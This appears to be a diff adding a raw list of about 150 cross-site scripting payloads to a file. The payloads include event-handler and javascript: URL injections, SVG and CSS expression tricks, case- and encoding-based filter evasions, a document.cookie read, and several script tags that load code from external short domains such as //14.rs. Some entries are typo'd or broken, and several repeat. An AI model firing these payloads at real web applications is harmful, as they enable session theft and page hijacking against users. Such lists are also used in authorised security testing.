@@ -1,0 +1,152 @@
+<script>alert('Reflected XSS');</script>
+<script>alert('Reflected XSS')</script>
+<img src=x onerror="alert(125325325);">
+<img src=x onerror="alert(125325325)">
+<svg onload="alert('SVG Loaded!')">
+<iframe src="javascript:alert('Iframe Alert!');"></iframe>
+<script>console.log(document.cookie);</script>
+<script>document.body.innerHTML = '<h1>Injected!</h1>';</script>
+<script>setTimeout(() => { alert('Delayed XSS'); }, 2000);</script>
+<a href="javascript:void(0);" onclick="alert('Link Clicked!')">Click me</a>
+<h1 onmouseover="alert('Hovered!')">Hover Over Me</h1>
+<input type="text" onfocus="alert('Input Focused!');" />
+<script>document.body.onload = function() { alert('Page Loaded!'); };</script>
+<button onclick="alert('Button Pressed!')">Press Me!</button>
+<textarea oninput="alert('Text Changed!')">Type Here</textarea>
+<script>fetch("http://example.com");</script>
+<a href="javascript:alert('JavaScript URL!')">Click for JS Alert</a>
+<script>document.write('<p>Dynamically Written Content</p>');</script>
+<div onmouseover="alert('Mouse Over!')">Mouse Over Me</div>
+<script>history.pushState({}, '', '/new-page');</script>
+<p onclick="alert('Paragraph Clicked!')">Click this paragraph</p>
+<style>.x{background:url("javascript:alert('CSS Alert')");}</style>
+"><h1 onclick="alert('Injected Header!')">New Header</h1>
+<script>window.location='javascript:alert(123)';</script>
+<script>document.boby.innerHTML = '<img src=x onerror=alert(4)>';</script>
+<div onmouseleave="alert('Mouse Left!')">Hover and Leave</div>
+<input type="text" value="<script>alert('XSS!');</script>"/>
+<script>document.body.innerHTML = '<p>New Content</p>' + document.body.innerHTML;</script>
+<script>for (var i=0; i < 3; i++){alert('Iteration: ' + i);}</script>
+<a href="#" onclick="alert('This is a fake link!'); return false;">Fake Link</a>
+<style>body:before { content: "XSS Test"; }</style>
+<p onclick="alert('Clicked Paragraph!')">Click me!</p>
+<script>alert('Basic XSS 1');</script>
+<img src=x onerror="alert('Basic Error!');">
+<svg onload="alert('Basic SVG');">
+<a href="javascript:alert('Basic Link!')">Basic Link</a>
+<button onclick="alert('Basic Button!')">Basic Button</button>
+<input onfocus="alert('Input Focus!')" />
+<h1 onmouseover="alert('Basic Hover!')">Hover Here</h1>
+<style>body:before { content: "Basic CSS Injection"; }</style>
+<script>alert(document.location);</script>
+<script>console.log('Basic JS Log');</script>
+"-prompt(8)-"
+";a=prompt,a()//"
+"-eval("window['pro'%2B'mpt'](8)")-"
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+"><svg onload=alert(1)//
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+<x contenteditable onblur=alert(1)>lose focus! 
+<x onclick=alert(1)>click this! 
+<x oncopy=alert(1)>copy this! 
+<x oncontextmenu=alert(1)>right click this! 
+<x oncut=alert(1)>copy this! 
+<x ondblclick=alert(1)>double click this! 
+<x ondrag=alert(1)>drag this! 
+<x contenteditable onfocus=alert(1)>focus this! 
+<x contenteditable oninput=alert(1)>input here! 
+<x contenteditable onkeydown=alert(1)>press any key! 
+<x contenteditable onkeypress=alert(1)>press any key! 
+<x contenteditable onkeyup=alert(1)>press any key! 
+<script>alert(1)//
+<form action=javascript:alert(1)><input type=submit> 
+<div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
+<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
+</svg>//["'`-->]]>]</div>
+<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
+<div id="108"><!-- IE 5-8 standards mode -->
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">
+<!-- IE 5-9 standards mode -->
+<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">
+<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>
+<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
+<a id="x"><rect fill="white" width="1000" height="1000"/></a>
+<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
+</svg>//["'`-->]]>]</div>
+<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
+<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
+</svg>//["'`-->]]>]</div>
+<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
+<div id="113"><div id="x">XXX</div>
+<style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>//["'`-->]]>]</div>
+<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div>
+<div id="115"><!--[if]><script>alert(115)</script -->
+<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>
+<div id="116"><div id="x">x</div>
+</a>//["'`-->]]>]</div>
+<div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
+<marquee loop=1 width=0 onfinish=alert(1)>
+<marguee/onstart=alert(1)>
+<svg onload=(alert)(1)>
+<script>$=1,alert($)</script>
+<form><button formaction="javascript:alert(1)">
+<div style=xss:expression(alert(1))>
+<div style=xss:expression(1)-alert(1)>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio\006e(alert(1))>
+<div style=xss:expressio\00006e(alert(1))>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio&#x5c;6e(alert(1))>
+<script>+-+-1-+-+alert(1)</script>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<script itworksinallbrowsers>/*<script* */alert(1)</script ?
+<img src ?itworksonchrome?\/onerror = alert(1)???
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> alert(1)
+<svg><li onload=alert(1)></li>
+<svg><listing onload=alert(1)></listing>
+<svg><main onload=alert(1)></main>
+<svg><map onload=alert(1)></map>
+<svg><mark onload=alert(1)></mark>
+<svg><marquee onload=alert(1)></marquee>
+<svg><menu onload=alert(1)></menu>
+<svg><menuitem onload=alert(1)></menuitem>
+<svg><meta onload=alert(1)></meta>
+<svg><meter onload=alert(1)></meter>
+<svg><multicol onload=alert(1)></multicol>
+<svg><nav onload=alert(1)></nav>
+<svg><nextid onload=alert(1)></nextid>
+<svg><nobr onload=alert(1)></nobr>
+<svg><noembed onload=alert(1)></noembed>
+<svg><noframes onload=alert(1)></noframes>
+<svg><noscript onload=alert(1)></noscript>
+<svg><ol onload=alert(1)></ol>
+<sCriPt x>(((confirm)))``</scRipt x>
+<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
+<deTAiLs/open/oNtoGGle=confirm()>
+<scRiPt y="><">/*<sCRipt* */prompt()</script
+<A href="javascript%26colon;confirm()">click
+<sVg oNloaD=write()>
+<A href=javas%26#99;ript:alert(1)>click
+<sCrIpt/"<a"/srC=data:=".<a,[8].some(confirm)>
+<svG/x=">"/oNloaD=confirm()//
+<--`<iMG/srC=` onerror=confirm``> --!>
+<SVg </onlOad ="1> (_=prompt,_(1)) "">
+<!--><scRipT src=//14.rs>
+<sCriPt/src=//14.rs?
+<sCRIpt x=">" src=//15.rs></script>
+<D3/OnMouSEenTer=[2].find(confirm)>z
+<D3"<"/OncLick="1>[confirm``]"<">z
+<D3/OnpOinTeReENter=confirm``>click here
+<svg><nobr onload=alert(1)></nobr>
+<svg><noembed onload=alert(1)></noembed>
+<svg><noframes onload=alert(1)></noframes>
+<svg><noscript onload=alert(1)></noscript>
